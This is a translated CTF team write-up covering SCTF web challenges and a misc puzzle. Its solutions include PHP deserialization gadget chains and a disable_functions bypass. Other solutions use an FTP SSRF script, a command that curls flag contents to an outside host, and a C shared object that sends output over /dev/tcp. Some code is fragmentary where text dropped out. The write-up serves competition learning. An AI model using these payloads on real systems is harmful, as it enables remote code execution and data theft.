# SCTF WriteUp by SU
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
Book.
## Web
###  FUMO_on_the_Christmas_tree
通过给定的一个 gadget class 文件来进行 PHP 反序列化 RCE。观察后发现只有一个类有 destructor，然后所有和系统互动的函数只有
readfile，所以这应该就是入口和出口。剩下的只需要找到一个调用路径从入口到出口。
所有的类都只有一个函数和一些成员变量。函数内部做的操作大概分为两类：
  * 对输入用函数做一些变换
  * 调用其它类的成员函数
我们先看所有对输入做变换的函数。其中有
  1. `crypt`、`sha1`、`md5`
  2. `base64_encode`
  3. `str_rot13`、`strrev`、`ucfirst`、`base64_decode`
第一类是不可逆的，必须避免遇到；第二类是可逆的，但必须满足条件，只有在 `base64_encode` 后再出现一个 `base64_decode`
才行，并且两者中间的操作必须最终保证数据一致；第三类是完全可逆的。要注意的是，有的里面还会出现直接的赋值语句，比如 `$xxx = $yyy`。如果是
`$xxx = $xxx`（自己赋给自己）的类型则可以，否则的话则需要避免遇到（因为右侧的变量不存在）。
接下来，对于所有的类我们需要建立一个调用关系。类里函数调用的方式有几种：
    // 第一种
    public function viqSfkeZ91($DUkiWcRS) {
        if (is_callable([$this->pHnfXT0TP, 'T81ZgYZlGt']))
            @$this->pHnfXT0TP->T81ZgYZlGt($DUkiWcRS);
    }
    // 第二种
    public function __invoke($value) {
        $key = base64_decode('QThTQjRHWm1WRw==');
        @$this->BUDQkw->zvHrWpSd($value[$key]);
    }
    // 第三种
    public function __call($name,$value) {
        extract([$name => 'FTTh89A9u']);
        if (is_callable([$this->IwXv56wBHu, $KDKR9Egl7]))
            call_user_func([$this->IwXv56wBHu, $KDKR9Egl7], ...$value);
    }
    // 第四种
    public function ttcoBkt($a06sSms0Pd) {
        call_user_func($this->Z9vliIEZ9u, ['upGnwrVnpV' => $a06sSms0Pd]);
    }
  * 第一种找哪个类有`T81ZgYZlGt`。
  * 第二种找哪个类有`zvHrWpSd`。
  * 第三种需要看`extract`里面的参数，找到哪个类有`FTTh89A9u`。处理的时候要注意第三种等价于第一种的写法：
    public function KDKR9Egl7($value) {
        if (is_callable([$this->IwXv56wBHu, 'FTTh89A9u']))
            @$this->IwXv56wBHu->FTTh89A9u($value);
    }
  * 第四种只能调用第二种，需要找哪个类的`__invoke`函数的`base64_decode`的参数是`upGnwrVnpV`的 Base64 编码字符串。
如果一个类可以通过某种方式（保证输入是上文所述可逆变化的条件下）带着输入调用另一个类，则可以从这个类到达另一个类。那接下来我们直接在上文建立好调用关系的情况下，在这些类上（看成一个图）从入口开始进行
DFS，中间记录经过的类、函数和对输入进行的变换。如果能够在满足上述条件的情况下到达出口，则成功找到一条调用路径。
剩下的就是用现成的 PHP 解析库解析所有的类，构建上述关系并且跑算法，最后得出一条路径，再手动构造序列化字符串和输入即可。
###  Upload_it
    import requests
    import os
    url = "http://124.71.199.229:8778/"
    s = requests.Session()
    s.get(url)
    cookie = s.cookies.get("PHPSESSID")
    def store(path,name,con):
        r = s.post(url,files={"file":(name,con),"path":(None,path)})
    serSes = os.popen("php gadget.php").read()
    store("../../../../tmp","sess_"+cookie,serSes)
    print(s.post(url,files={"file":("pew","XXD")}).text)
    value = new \Opis\Closure\SerializableClosure($func);
      }
    }
    include_once "vendor/autoload.php";
    print("upload_path|".(serialize(new \Symfony\Component\String\LazyString())));
###  Loginme
    X-real-ip:127.0.0.1
    age={{$}}
###  Ezuros
    import requests
    import os
    url = "http://124.70.204.21:7777/"
    payload = os.popen("php gadget.php").read()
    s = requests.Session()
    s.get(url)
    s.post(url+"config",json={'XXD|{}FF'.format(payload):'XXD'})
    print(s.get(url+"config").text)
    socket = $x;
            }
        }
        class BufferHandler
        {
            protected $handler;
            protected $bufferSize = -1;
            protected $buffer;
            protected $level = null;
            protected $initialized = true;
            protected $bufferLimit = -1;
            protected $processors;
            function __construct($methods, $command)
            {
                $this->processors = $methods;
                $this->buffer = [$command];
                $this->handler = clone $this;
            }
        }
    }
    namespace {
    $cmd = '$(printf "curl https://thegrandpewd\\x2epythonanywhere\\x2ecom/`cat /etc/*/flag`")';
    $obj = new \Monolog\Handler\SyslogUdpHandler(
            new \Monolog\Handler\BufferHandler(
                ['current', 'system'],
                [$cmd, 'level' => null]
            )
        );
    echo serialize([$obj]);
    }
    ?>
###  Rceme
diff
    pcntl_fork, pcntl_waitpid, pcntl_wait, pcntl_signal, pcntl_signal_get_handler, pcntl_signal_dispatch, pcntl_wifexited, pcntl_wifstopped, pcntl_wifsignaled, pcntl_wexitstatus, pcntl_wtermsig, pcntl_wstopsig, pcntl_exec, pcntl_alarm, pcntl_get_last_error, pcntl_errno, pcntl_strerror, pcntl_getpriority, pcntl_setpriority, pcntl_sigprocmask, pcntl_sigwaitinfo, pcntl_sigtimedwait, pcntl_wifcontinued, pcntl_async_signals, pcntl_unshare, cli_set_process_title, cli_get_process_title, chroot, dl,
    strlen, error_reporting, set_error_handler, create_function, preg_match, preg_replace phpinfo, strstr, escapeshellarg, getenv, putenv, call_user_func, unserialize, var_dump, highlight_file, show_source, ini_get , end,
简单看一下，知道是无参数 rce 抄一下脚本，改一下
    def one(s):
        ss = ""
        for each in s:
            ss += "%" + str(hex(255 - ord(each)))[2:].upper()
        return f"[~{ss}][!%FF]("
    def makeSTR(s):
        ss = ""
        for each in s:
            ss += "%" + str(hex(255 - ord(each)))[2:].upper()
        return f"[~{ss}][!%FF]"
    """
    组成 system(next(getallheaders()));
    a=whoami
    """
    def make(xd):
        a = xd.strip(")")
        aa = a.split("(")
        s = ""
        for each in aa[:-1]:
            s += one(each)
        s += ")" * (len(aa) - 1)
        return s
然后看一下 php
文档，[https://www.php.net/manual/en/functions.arguments.php#:~:text=Example%20%2310%20Using%20…%20to%20provide%20arguments](https://www.php.net/manual/en/functions.arguments.php#:~:text=Example%20#10%20Using%20...%20to%20provide%20arguments)
知道可以用 `...[1,2]` 来传多个参数，可以用 `create_function` 来执行任意 php
代码，还可以序列化传数组，用反序列化函数弄出来就行了。
接下来就是 iconv bypass df 了，抄一下 bytectf final 的，用 filter
绕函数就行。问题比较大就是怎么写文件，调了半天，最后用 `SplFileObject`
    import craft
    import requests
    def arb(s):
        return craft.makeSTR(s) + "." + craft.make("var_dump()")
    url = "http://localhost:3333"
    # payload = """a:2:{i:0;s:198:"){}$url = 'http://47.100.54.220/poc.so';$file = new SplFileObject($url, "r");$a = "";while(!$file->eof()) {$a = $a.$file->fgets();}$file=new SplFileObject('/tmp/payload.so','w');$file->fwrite($a);//";i:1;s:0:"";}"""
    payload = """a:2:{i:0;s:208:"){}$url = 'http://47.100.54.220/gconv-modules';$file = new SplFileObject($url, "r");$a = "";while(!$file->eof()) {$a = $a.$file->fgets();}$file=new SplFileObject('/tmp/gconv-modules','w');$file->fwrite($a);//";i:1;s:0:"";}"""
    code = craft.makeSTR('call_user_func') + '(' + craft.makeSTR("create_function")
    code += "("
    code += "..." + craft.makeSTR("unserialize") + "(" + arb(payload) + ")"
    code += "));"
    #code += craft.make("var_dump(end(getallheaders()))") + ";"
    print(code)
    eof()) {
        $a = $a.$file->fgets();
    }
    $file=new SplFileObject('/tmp/p.so','w');
    $file->fwrite($a);
    #include 
    #include 
    void gconv() {}
    void gconv_init() {
      puts("pwned");
      system("bash -c '/readflag>/dev/tcp/ip/port'");
      exit(0);
    }
参考
用原生类把so和modules上传到tmp然后用伪协议读一下触发：
    putenv("GCONV_PATH=/tmp/");show_source("php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so");
###  upload it 2
根据upload it 1 得知用sleep触发，还是一样用LazyString调一下sandbox的backdoor方法
    value = $value;
            }
        }
    }
    namespace {
        class sandbox {
            private $evil;
            public function __construct(){
                $this->evil = "/flag";
            }
        }
        use Symfony\Component\String\LazyString;
        $value = [new sandbox,"backdoor"];
        $lazy = new LazyString($value);
        $part1 = urlencode('upload_path|s:45:"/tmp/sandbox/2b2f38818b2ac2cd6df0b9cd09e1ad88";|');
        echo $part1.urlencode(serialize($lazy));
    }
    %75%70%6c%6f%61%64%5f%70%61%74%68%7c%73%3a%34%35%3a%22%2f%74%6d%70%2f%73%61%6e%64%62%6f%78%2f%32%62%32%66%33%38%38%31%38%62%32%61%63%32%63%64%36%64%66%30%62%39%63%64%30%39%65%31%61%64%38%38%22%3b%7c%4f%3a%33%35%3a%22%53%79%6d%66%6f%6e%79%5c%43%6f%6d%70%6f%6e%65%6e%74%5c%53%74%72%69%6e%67%5c%4c%61%7a%79%53%74%72%69%6e%67%22%3a%31%3a%7b%73%3a%34%32%3a%22%00%53%79%6d%66%6f%6e%79%5c%43%6f%6d%70%6f%6e%65%6e%74%5c%53%74%72%69%6e%67%5c%4c%61%7a%79%53%74%72%69%6e%67%00%76%61%6c%75%65%22%3b%61%3a%32%3a%7b%69%3a%30%3b%4f%3a%37%3a%22%73%61%6e%64%62%6f%78%22%3a%32%3a%7b%73%3a%31%33%3a%22%00%73%61%6e%64%62%6f%78%00%65%76%69%6c%22%3b%73%3a%35%3a%22%2f%66%6c%61%67%22%3b%73%3a%31%31%3a%22%75%70%6c%6f%61%64%5f%70%61%74%68%22%3b%4e%3b%7d%69%3a%31%3b%73%3a%38%3a%22%62%61%63%6b%64%6f%6f%72%22%3b%7d%7d
贴burp上decode一下post到tmp目录覆盖session
###  GoFTP
根据题目描述和 hint 信息可以大概猜到预期通过 FTP 来做 SSRF（PASV 模式传文件时，客户端会建立一个新的连接到服务端指定端口）。具体的
HTTP 请求内容在比赛的时候是通过结合逆向和动态调试的方式，触发 binary /api/register 接口本地监听获得的。在通过 SSRF 注册
username 为 admin 的用户之后，可正常登录通过访问 /admin 获得 flag。
    #!/usr/bin/env python3
    from pwn import *
    import time
    context.log_level = 'debug'
    l = listen(2121)
    _ = l.wait_for_connection()
    data = listen(9000)
    l.sendline(b'220 Test FTP Server')
    l.recvuntil(b'USER ')
    l.sendline(b'331 Password required')
    l.recvuntil(b'PASS')
    l.sendline(b'230 User logged in')
    l.recvuntil(b'TYPE')
    l.sendline(b'200 Switching to Binary mode')
    l.recvuntil(b'PASV')
    time.sleep(5)
    l.sendline(b'227 Entering Passive Mode (127,0,0,1,35,40)')
    l.recvuntil(b'STOR')
    l.sendline(b'150 Opening BINARY mode data connection for foo.txt')
    #_ = data.wait_for_connection()
    #data.recvall()
    l.sendline(b'226 Transfer complete')
    l.recvuntil(b'QUIT')
    l.close()
    PUT /api/user HTTP/1.1
    Host: 127.0.0.1:9000
    User-Agent: GRequests/0.10
    Content-Length: 71
    Content-Type: application/json
    Accept-Encoding: gzip
    {"email": "PI:EMAIL", "username": "admin", "password": "ahDi3aid"}
## Misc
###  This_is_A_tree
> 一颗圣诞树，还有好多礼物,flag需要SCTF{}噢 ,a beautiful tree,U need to know some Chinese
> traditional knowledge,flag need a “SCTF{your_flag}”
遍历bata+base64+中文转二进制转ascii
中序遍历后的字符串为：Q2hpbmVzZSB0cmFkaXRpb25hbCBjdWx0dXJlIGlzIGJyb2FkIGFuZCBwcm9mb3VuZCEgU28gSSBXYW50IEdpdmUgWW91IE15IEZsYWcgQnV0IFlvdSBOZWVkIERlY29kZSBJdC5FbmpveSBUaGUgRmxhZyEhOuW4iCDlhZEg5aSNIOaNnyDlt70g6ZyHIOaZiyDlp6Qg5aSn6L+HIOiuvCDlmazll5Eg6ZyHIOaBkiDoioIg6LGrIA==
base64后：
Chinese traditional culture is broad and profound! So I Want Give You My Flag
But You Need Decode It.Enjoy The Flag!!:师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫
[https://github.com/BjdsecCA/BJDCTF2020_January参考里面的伏羲六十四卦](https://github.com/BjdsecCA/BJDCTF2020_January%E5%8F%82%E8%80%83%E9%87%8C%E9%9D%A2%E7%9A%84%E4%BC%8F%E7%BE%B2%E5%85%AD%E5%8D%81%E5%9B%9B%E5%8D%A6)